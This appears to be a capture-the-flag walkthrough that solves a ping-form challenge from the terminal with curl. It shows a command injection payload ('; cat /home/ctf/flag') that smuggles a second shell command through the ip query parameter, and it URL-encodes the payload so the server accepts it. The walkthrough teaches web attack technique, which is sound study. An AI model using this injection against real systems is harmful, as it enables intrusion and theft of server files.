# One More Pinger

That was simple.
Now it's time for a more difficult use case of query parameters.
Yes, it's "Pinger" again.
But this time, you'll solve it **entirely from the terminal**.

First, get the HTML content of the website:

```html
root@kali:~# curl http://141.85.224.70:8069/pinger

<html>

    <head>
        <title>Pinger</title>
    </head>

    <h2>My purpose is simple: I check the availability of network hosts by pinging their IP. Use the text box below to give me an IP to ping.</h2>

    <form action="/ping" method="get">
        IP: <input type="text" name="ip"></br>
        <input type="submit" value="Submit">
    </form>


</html>
```

The IP is retrieved from the user via this `form`:

```html
<form action="/ping" method="get">
    IP: <input type="text" name="ip"></br>
    <input type="submit" value="Submit">
</form>
```

From here we get the following information:

- upon pressing "Submit", a `GET` request is sent to `/ping`
- the input we provide is set as the value of the key `ip`

So a request URL that gets the flag would look like this:

```console
GET /ping?ip=; cat /home/ctf/flag
```

Let's try to do this with `curl`:

```console
root@kali:~# curl -v -G -d 'ip=; cat /home/ctf/flag' http://141.85.224.70:8069/ping
*   Trying 141.85.224.70:8069...
* TCP_NODELAY set
* Connected to 141.85.224.70 (141.85.224.70) port 8069 (#0)
> GET /ping?ip=; cat /home/ctf/flag HTTP/1.1
> Host: 141.85.224.70:8069
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
[...]
```

Why does the request fail?
Look at the request:

```console
GET /ping?ip=; cat /home/ctf/flag HTTP/1.1
```

The value of the query parameter `ip` contains some forbidden characters: `;`, `/` and space.
We need to send them encoded for URLs.
For this we use the `--data-urlencode` parameter for `curl`:

```console
root@kali:~# curl -v -G --data-urlencode 'ip=; cat /home/ctf/flag' http://141.85.224.70:8069/ping
*   Trying 141.85.224.70:8069...
* TCP_NODELAY set
* Connected to 141.85.224.70 (141.85.224.70) port 8069 (#0)
> GET /ping?ip=%3B%20cat%20%2Fhome%2Fctf%2Fflag HTTP/1.1
> Host: 141.85.224.70:8069
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
[...]
```

Notice that now the value of `ip` looks stranger: `ip=%3B%20cat%20%2Fhome%2Fctf%2Fflag`:

- `%3B` is the URL encoding for `;`
- `%20` is the URL encoding for space
- `%2F` is the URL encoding for `/`
